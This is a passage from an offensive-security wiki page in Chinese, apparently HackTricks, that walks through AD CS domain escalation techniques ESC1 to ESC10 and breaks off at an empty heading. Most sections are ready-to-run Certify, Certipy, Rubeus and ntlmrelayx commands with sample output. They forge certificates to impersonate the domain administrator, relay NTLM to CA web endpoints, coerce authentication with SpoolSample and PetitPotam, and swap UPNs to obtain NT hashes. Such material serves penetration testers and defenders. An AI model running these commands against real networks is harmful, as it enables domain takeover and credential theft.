# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**以下是相关文章中 escalation technique 部分的摘要：**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 配置错误的 Certificate Templates - ESC1

### 说明

### 配置错误的 Certificate Templates - ESC1 详解

- **Enterprise CA 向低权限用户授予了 Enrolment 权限。**
- **不需要 Manager approval。**
- **不需要授权人员的签名。**
- **Certificate Templates 上的 Security descriptors 过于宽松，允许低权限用户获得 Enrolment 权限。**
- **Certificate Templates 被配置为定义有助于 authentication 的 EKU：**
- 包含 Extended Key Usage (EKU) 标识符，例如 Client Authentication (OID 1.3.6.1.5.5.7.3.2)、PKINIT Client Authentication (1.3.6.1.5.2.3.4)、Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)、Any Purpose (OID 2.5.29.37.0) 或没有 EKU (SubCA)。
- **Template 允许 requesters 在 Certificate Signing Request (CSR) 中加入 subjectAltName：**
- 如果证书中存在 subjectAltName (SAN)，Active Directory (AD) 会在身份验证时优先使用它。这意味着通过在 CSR 中指定 SAN，可以请求证书来 impersonate 任意用户（例如 domain administrator）。requester 是否可以指定 SAN，由 Certificate Template 的 AD object 中的 `mspki-certificate-name-flag` property 指示。此 property 是一个 bitmask，如果存在 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag，则允许 requester 指定 SAN。

> [!CAUTION]
> 上述配置允许低权限用户请求包含任意 SAN 的证书，从而通过 Kerberos 或 SChannel 以任意 domain principal 的身份进行 authentication。

此功能有时用于支持产品或 deployment services 动态生成 HTTPS 或 host certificates，也可能是由于缺乏理解而启用。

需要注意的是，使用此选项创建证书会触发 warning；但复制现有的 Certificate Template（例如已启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 的 `WebServer` template），然后修改它以加入 authentication OID 时，则不会触发该 warning。

### 利用

要**查找存在漏洞的 Certificate Templates**，可以运行：
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
要**利用此漏洞冒充管理员**，可以运行：
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
然后，你可以将生成的 **证书转换为 `.pfx`** 格式，再次使用 Rubeus 或 certipy **进行身份验证**：
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows 二进制文件“Certreq.exe”和“Certutil.exe”可用于生成 PFX：https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

可以通过运行以下 LDAP query，对 AD Forest 配置架构中的证书模板进行 enumeration，具体筛选不需要批准或签名、具有 Client Authentication 或 Smart Card Logon EKU，并启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag 的模板：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 配置错误的证书模板 - ESC2

### 说明

第二种滥用场景是第一种场景的变体：

1. Enterprise CA 向低权限用户授予了 Enrollment 权限。
2. 禁用了管理员批准要求。
3. 省略了授权签名要求。
4. 证书模板上过于宽松的 security descriptor 向低权限用户授予了证书 Enrollment 权限。
5. **证书模板被定义为包含 Any Purpose EKU，或不包含 EKU。**

**Any Purpose EKU** 允许攻击者出于**任何目的**获取证书，包括客户端身份验证、服务器身份验证、代码签名等。可以采用与 **ESC3** 相同的 **technique** 来利用此场景。

不包含 **EKU** 的证书会作为 subordinate CA 证书运行，因此可以被用于**任何目的**，并且**还可以用于签发新证书**。因此，攻击者可以利用 subordinate CA 证书，在新证书中指定任意 EKU 或字段。

但是，如果 subordinate CA 未被 **`NTAuthCertificates`** 对象信任（默认设置），则为**域身份验证**创建的新证书将无法正常工作。尽管如此，攻击者仍然可以创建具有任意 EKU 和任意证书值的**新证书**。这些证书可能被**滥用**于各种用途（例如代码签名、服务器身份验证等），并可能对网络中的其他应用产生重大影响，例如 SAML、AD FS 或 IPSec。

要在 AD Forest 的配置架构中枚举符合此场景的模板，可以运行以下 LDAP 查询：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 配置错误的 Enrollment Agent 模板 - ESC3

### 说明

此场景与第一个和第二个场景类似，但**滥用**了一个**不同的 EKU**（Certificate Request Agent）以及 **2 个不同的模板**（因此有 2 组要求）。

**Certificate Request Agent EKU**（OID 1.3.6.1.4.1.311.20.2.1）在 Microsoft 文档中称为 **Enrollment Agent**，允许主体**代表其他用户申请** **certificate**。

**“enrollment agent”** 会在此类**模板**中进行申请，并使用生成的 **certificate** **代表其他用户为 CSR 联署**。随后，它会将**联署后的 CSR**发送到 CA，申请一个**允许“代表他人申请”**的**模板**，CA 则会返回一个**属于“其他”用户的 certificate**。

**要求 1：**

- Enterprise CA 向低权限用户授予申请权限。
- 未要求经理审批。
- 不要求授权签名。
- certificate 模板的安全描述符权限过于宽松，向低权限用户授予了申请权限。
- certificate 模板包含 Certificate Request Agent EKU，从而能够代表其他主体申请其他 certificate 模板。

**要求 2：**

- Enterprise CA 向低权限用户授予申请权限。
- 绕过经理审批。
- 模板的架构版本为 1 或高于 2，并指定了一个要求 Certificate Request Agent EKU 的 Application Policy Issuance Requirement。
- certificate 模板中定义的某个 EKU 允许域身份验证。
- CA 未应用 Enrollment Agent 限制。

### 利用

你可以使用 [**Certify**](https://github.com/GhostPack/Certify) 或 [**Certipy**](https://github.com/ly4k/Certipy) 来利用此场景：
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
允许 **获取** **enrollment agent certificate** 的 **users**、允许 **agents** 进行 enrollment 的模板，以及 enrollment agent 可代表其执行操作的 **accounts**，都可以由 enterprise CA 进行限制。具体操作是打开 `certsrc.msc` **snap-in**，**右键单击 CA**，**点击 Properties**，然后**导航**到“Enrollment Agents”选项卡。

不过需要注意，CA 的**默认**设置是“**Do not restrict enrollment agents**”。当管理员启用 enrollment agents 限制，并将其设置为“Restrict enrollment agents”时，默认配置仍然极其宽松。它允许 **Everyone** 以任何人的身份在所有模板中进行 enrollment。

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

**certificate templates** 上的 **security descriptor** 定义了特定 **AD principals** 针对模板所拥有的**权限**。

如果 **attacker** 拥有**修改** **template** 所需的**权限**，并能够**实施** **prior sections** 中所述的任何**可利用的错误配置**，则可能实现 privilege escalation。

适用于 certificate templates 的重要权限包括：

- **Owner:** 授予对对象的隐式控制权，允许修改任何属性。
- **FullControl:** 授予对对象的完全控制权，包括修改任何属性的能力。
- **WriteOwner:** 允许将对象的所有者修改为由 attacker 控制的 principal。
- **WriteDacl:** 允许调整访问控制，从而可能授予 attacker FullControl。
- **WriteProperty:** 允许编辑任意对象属性。

### Abuse

要识别对模板和其他 PKI 对象拥有编辑权限的 principals，请使用 Certify 进行枚举：
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
一个类似于前一个示例的 privesc：

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 是指用户对证书模板拥有写入权限。例如，可以利用此权限覆盖证书模板的配置，使该模板容易受到 ESC1 攻击。

正如上方路径所示，只有 `JOHNPC` 拥有这些权限，但我们的用户 `JOHN` 对 `JOHNPC` 新增了 `AddKeyCredentialLink` 边。由于此技术与证书相关，我也实现了这种攻击，该攻击称为 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)。下面简要展示 Certipy 的 `shadow auto` 命令如何获取受害者的 NT hash。
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** 可以通过单条命令覆盖证书模板的配置。**默认情况下**，Certipy 会**覆盖**配置，使其**容易受到 ESC1 攻击**。我们还可以指定 **`-save-old` 参数以保存旧配置**，这在攻击后**恢复**配置时会很有用。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

由 ACL 构成的复杂互联关系网络不仅涉及证书模板和证书颁发机构，还包括多个其他对象，这些关系可能影响整个 AD CS 系统的安全性。这些可能对安全性产生重大影响的对象包括：

- CA server 的 AD computer object，可能通过 S4U2Self 或 S4U2Proxy 等机制遭到 compromise。
- CA server 的 RPC/DCOM server。
- 特定容器路径 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 中的任何后代 AD object 或 container。该路径包括但不限于 Certificate Templates container、Certification Authorities container、NTAuthCertificates object 和 Enrollment Services Container 等 container 和 object。

如果低权限 attacker 成功控制其中任何一个关键组件，PKI 系统的安全性就可能遭到破坏。

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) 中讨论的主题也涉及 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag 的影响，Microsoft 对此也进行了说明。当该配置在 Certification Authority（CA）上启用时，允许在 **subject alternative name** 中加入 **user-defined values**，适用于**任何 request**，包括从 Active Directory® 构造的 request。因此，intruder 可以通过**任何 template** 进行 enrollment，只要该 template 配置为支持 domain **authentication**，尤其是那些允许 **unprivileged** user enrollment 的 template，例如标准 User template。这样，intruder 就能获取 certificate，并以 domain administrator 或 domain 中的**任何其他活动实体**身份进行 authentication。

**Note**：通过 `certreq.exe` 中的 `-attrib "SAN:"` argument（称为“Name Value Pairs”）向 Certificate Signing Request（CSR）添加 **alternative names** 的方式，与 ESC1 中利用 SAN 的 exploitation strategy **不同**。这里的区别在于 **account information 的封装方式**——它位于 certificate attribute 中，而不是 extension 中。

### Abuse

组织可以使用以下 `certutil.exe` command 验证该 setting 是否已启用：
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
此操作本质上使用了 **远程注册表访问**，因此，另一种方法可能是：
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
像 [**Certify**](https://github.com/GhostPack/Certify) 和 [**Certipy**](https://github.com/ly4k/Certipy) 这样的工具能够检测并利用此配置错误：
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
要修改这些设置，假设拥有 **domain administrative** 权限或等效权限，可以从任意工作站执行以下命令：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
要在你的环境中禁用此配置，可以使用以下命令移除该标志：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 在 2022 年 5 月安全更新之后，新签发的 **certificates** 将包含一个 **security extension**，其中包含 **requester 的 `objectSid` 属性**。对于 ESC1，此 SID 来源于指定的 SAN。但是，对于 **ESC6**，该 SID 与 **requester 的 `objectSid`** 一致，而不是来自 SAN。\
> 要利用 ESC6，系统必须易受 ESC10（Weak Certificate Mappings）影响，因为 ESC10 会优先使用 **SAN，而不是新的 security extension**。

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

证书颁发机构的访问控制通过一组用于管理 CA 操作的权限来维护。可以通过访问 `certsrv.msc`，右键单击 CA，选择属性，然后进入 Security 选项卡来查看这些权限。此外，还可以使用 PSPKI module，通过以下命令枚举权限：
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
这提供了对主要权限的见解，即 **`ManageCA`** 和 **`ManageCertificates`**，分别对应“CA administrator”和“Certificate Manager”角色。

#### Abuse

在证书颁发机构上拥有 **`ManageCA`** 权限后，principal 可以使用 PSPKI 远程操纵设置。其中包括启用 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 标志，以允许在任何 template 中指定 SAN，这是 domain escalation 的关键环节。

通过使用 PSPKI 的 **Enable-PolicyModuleFlag** cmdlet，可以简化此过程，无需直接与 GUI 交互即可完成修改。

拥有 **`ManageCertificates`** 权限可以批准待处理的 requests，从而有效绕过“CA certificate manager approval”保护措施。

可以结合使用 **Certify** 和 **PSPKI** modules 来请求、批准并下载 certificate：
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### 说明

> [!WARNING]
> 在**上一个攻击**中，使用了 **`Manage CA`** 权限来**启用** **EDITF_ATTRIBUTESUBJECTALTNAME2** 标志，以执行 **ESC6 attack**，但在重启 CA 服务（`CertSvc`）之前不会生效。当用户拥有 **`Manage CA`** 访问权限时，该用户也被允许**重启服务**。但是，这**并不意味着该用户可以远程重启服务**。此外，由于 2022 年 5 月的安全更新，在大多数已修补的环境中，E**SC6 可能无法开箱即用**。

因此，这里介绍另一种攻击。

前提条件：

- 仅需 **`ManageCA` permission**
- **`Manage Certificates`** permission（可通过 **`ManageCA`** 授予）
- Certificate template **`SubCA`** 必须处于**启用**状态（可通过 **`ManageCA`** 启用）

该技术利用了这样一个事实：拥有 `Manage CA` 和 `Manage Certificates` access right 的用户可以**签发失败的证书请求**。**`SubCA`** certificate template **vulnerable to ESC1**，但只有**管理员**可以在该模板中进行注册。因此，**用户**可以请求在 **`SubCA`** 中注册——该请求会被**拒绝**——但随后会由管理员签发。

#### Abuse

你可以通过将自己的用户添加为新的审核员，**授予自己 `Manage Certificates`** access right。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** 模板可以通过 `-enable-template` 参数在 CA 上**启用**。默认情况下，`SubCA` 模板已启用。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
如果我们已满足此 attack 的前提条件，就可以从**基于 `SubCA` template 请求证书**开始。

**此请求将被拒绝**，但我们会保存 private key 并记下 request ID。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
通过 **`Manage CA` 和 `Manage Certificates`**，我们可以使用 `ca` 命令及 `-issue-request <request ID>` 参数，**签发失败的证书**请求。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最后，我们可以使用 `req` 命令和 `-retrieve <request ID>` 参数来**获取已颁发的证书**。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### 说明

除了经典的 ESC7 abuse（启用 EDITF attributes 或批准 pending requests）之外，**Certify 2.0** 还揭示了一种全新的 primitive，它只需要 Enterprise CA 上的 *Manage Certificates*（又称 **Certificate Manager / Officer**）role。

任何持有 *Manage Certificates* 的 principal 都可以执行 `ICertAdmin::SetExtension` RPC method。该 method 传统上由合法 CA 用于更新 **pending** requests 上的 extensions，但 attacker 可以滥用它，将一个 *non-default* certificate extension（例如自定义的 *Certificate Issuance Policy* OID，如 `1.1.1.1`）追加到等待批准的 request 中。

由于目标 template 没有为该 extension 定义 default value，因此 request 最终签发时，CA **不会**覆盖 attacker-controlled value。由此生成的 certificate 会包含 attacker 选择的 extension，该 extension 可能：

* 满足其他 vulnerable templates 的 Application / Issuance Policy requirements（从而导致 privilege escalation）。
* 注入额外的 EKUs 或 policies，使 certificate 在 third-party systems 中获得意外的 trust。

简而言之，*Manage Certificates* ——过去被认为是 ESC7 中“权限较低”的一半——现在可以被用于实现完整的 privilege escalation 或长期 persistence，而无需修改 CA configuration，也不需要权限限制更严格的 *Manage CA* right。

#### 使用 Certify 2.0 abuse 此 primitive

1. **提交一个会保持为 *pending* 的 certificate request。** 可以使用要求 manager approval 的 template 强制实现：
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **使用新的 `manage-ca` command** 向 pending request 追加 custom extension：
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*如果 template 尚未定义 *Certificate Issuance Policies* extension，则上述 value 会在签发后保留。*

3. **签发 request**（如果你的 role 同时拥有 *Manage Certificates* approval rights），或者等待 operator 批准。签发后，下载 certificate：
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. 生成的 certificate 现在包含恶意的 issuance-policy OID，可用于后续 attacks（例如 ESC13、domain escalation 等）。

> NOTE: 通过 `ca` command 和 `-set-extension` parameter，也可以使用 Certipy ≥ 4.7 执行相同的 attack。

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 说明

> [!TIP]
> 在安装了 **AD CS** 的 environments 中，如果存在一个 **web enrollment endpoint vulnerable**，并且至少发布了一个允许 **domain computer enrollment and client authentication** 的 **certificate template**（例如默认的 **`Machine`** template），则 **任何 spooler service active 的 computer 都可能被 attacker compromise**！

AD CS 支持多种 **HTTP-based enrollment methods**，这些 methods 通过 administrators 可能安装的额外 server roles 提供。这些用于 HTTP-based certificate enrollment 的 interfaces 容易受到 **NTLM relay attacks** 的影响。attacker 可以从一台 **compromised machine** 发起攻击，impersonate 任何通过 inbound NTLM 进行 authentication 的 AD account。在 impersonate victim account 的同时，attacker 可以访问这些 web interfaces，使用 `User` 或 `Machine` certificate templates **request 一个 client authentication certificate**。

- **web enrollment interface**（较旧的 ASP application，可通过 `http://<caserver>/certsrv/` 访问）默认仅使用 HTTP，不提供针对 NTLM relay attacks 的 protection。此外，它通过 Authorization HTTP header 明确只允许 NTLM authentication，使 Kerberos 等更安全的 authentication methods 无法适用。
- **Certificate Enrollment Service**（CES）、**Certificate Enrollment Policy**（CEP）Web Service 和 **Network Device Enrollment Service**（NDES）默认支持通过其 Authorization HTTP header 使用 negotiate authentication。Negotiate authentication **同时支持** Kerberos 和 **NTLM**，因此 attacker 可以在 relay attacks 期间将 authentication **downgrade 为 NTLM**。虽然这些 web services 默认启用 HTTPS，但单独使用 HTTPS **无法防御 NTLM relay attacks**。只有将 HTTPS 与 channel binding 结合使用，才能为 HTTPS services 提供针对 NTLM relay attacks 的 protection。遗憾的是，AD CS 不会在 IIS 上启用 Extended Protection for Authentication，而 channel binding 需要该功能。

NTLM relay attacks 的一个常见 **issue** 是 NTLM sessions 的 **short duration**，以及 attacker 无法与要求 NTLM signing 的 services 交互。

不过，通过利用 NTLM relay attack 为 user 获取 certificate，可以克服这一限制，因为 certificate 的 validity period 决定 session 的 duration，并且该 certificate 可以用于 **mandate NTLM signing** 的 services。有关如何使用 stolen certificate 的说明，请参阅：


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attacks 的另一个 limitation 是，**victim account 必须对 attacker-controlled machine 进行 authentication**。attacker 可以等待，或者尝试 **force** 该 authentication：


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify) 的 `cas` 会枚举 **enabled HTTP AD CS endpoints**：
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` 属性由企业 Certificate Authorities（CAs）用于存储 Certificate Enrollment Service（CES）端点。可以使用工具 **Certutil.exe** 解析并列出这些端点：
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### 使用 Certify 进行滥用
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### 使用 [Certipy](https://github.com/ly4k/Certipy) 进行滥用

Certipy 默认根据模板 `Machine` 或 `User` 请求证书，具体取决于被 relay 的账户名称是否以 `$` 结尾。可以通过使用 `-template` 参数指定其他模板。

随后可以使用类似 [PetitPotam](https://github.com/ly4k/PetitPotam) 的技术强制进行身份验证。处理域控制器时，必须指定 `-template DomainController`。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## 无安全扩展 - ESC9 <a href="#id-5485" id="id-5485"></a>

### 说明

**`CT_FLAG_NO_SECURITY_EXTENSION`**（`0x80000`）是 **`msPKI-Enrollment-Flag`** 的新值，也称为 ESC9，用于阻止在证书中嵌入新的 **`szOID_NTDS_CA_SECURITY_EXT` security extension**。当 **`StrongCertificateBindingEnforcement`** 设置为 `1`（默认设置）时，此标志会变得相关，而设置为 `2` 时则不同。在 Kerberos 或 Schannel 中可能利用较弱的 certificate mapping 的场景下（如 ESC10），该标志的重要性会进一步提高，因为没有 ESC9 并不会改变相关要求。

以下条件会使此标志的设置变得重要：

- `StrongCertificateBindingEnforcement` 未调整为 `2`（默认为 `1`），或 `CertificateMappingMethods` 包含 `UPN` 标志。
- 证书在 `msPKI-Enrollment-Flag` 设置中标记了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。
- 证书指定了任意 client authentication EKU。
- 对任意账户拥有 `GenericWrite` 权限，从而可以 compromise 另一个账户。

### Abuse 场景

假设 `John@corp.local` 对 `Jane@corp.local` 拥有 `GenericWrite` 权限，目标是 compromise `Administrator@corp.local`。`Jane@corp.local` 有权限 enroll 的 `ESC9` certificate template，在其 `msPKI-Enrollment-Flag` 设置中配置了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。

首先，利用 `John` 的 `GenericWrite`，通过 Shadow Credentials 获取 `Jane` 的 hash：
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
随后，`Jane` 的 `userPrincipalName` 被修改为 `Administrator`，特意省略了 `@corp.local` 域部分：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
鉴于 `Administrator@corp.local` 仍作为 `Administrator` 的 `userPrincipalName` 保持独立，此修改不违反约束。

随后，以 `Jane` 的身份请求标记为存在漏洞的 `ESC9` certificate template：
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
据记录，该证书的 `userPrincipalName` 显示为 `Administrator`，不包含任何“object SID”。

随后，`Jane` 的 `userPrincipalName` 被恢复为其原始值 `Jane@corp.local`：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
现在尝试使用已签发的证书进行身份验证，即可获得 `Administrator@corp.local` 的 NT hash。由于证书中未指定域，命令必须包含 `-domain <domain>`：
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Explanation

ESC10 涉及域控制器上的两个注册表键值：

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 下 `CertificateMappingMethods` 的默认值为 `0x18`（`0x8 | 0x10`），此前设置为 `0x1F`。
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 下 `StrongCertificateBindingEnforcement` 的默认设置为 `1`，此前为 `0`。

**Case 1**

当 `StrongCertificateBindingEnforcement` 配置为 `0` 时。

**Case 2**

如果 `CertificateMappingMethods` 包含 `UPN` 位（`0x4`）。

### Abuse Case 1

当 `StrongCertificateBindingEnforcement` 配置为 `0` 时，拥有 `GenericWrite` 权限的账户 A 可被利用来攻陷任意账户 B。

例如，攻击者对 `Jane@corp.local` 拥有 `GenericWrite` 权限，并希望攻陷 `Administrator@corp.local`。该过程与 ESC9 类似，因此可以使用任意 certificate template。

首先，利用 `GenericWrite` 通过 Shadow Credentials 获取 `Jane` 的 hash。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
随后，将 `Jane` 的 `userPrincipalName` 修改为 `Administrator`，故意省略 `@corp.local` 部分，以避免违反约束。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
随后，以 `Jane` 的身份使用默认的 `User` 模板请求一个启用客户端身份验证的证书。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` 的 `userPrincipalName` 随后恢复为其原始值 `Jane@corp.local`。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
使用获取的证书进行身份验证将获得 `Administrator@corp.local` 的 NT hash。由于证书中不包含域信息，因此必须在命令中指定域。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### 滥用场景 2

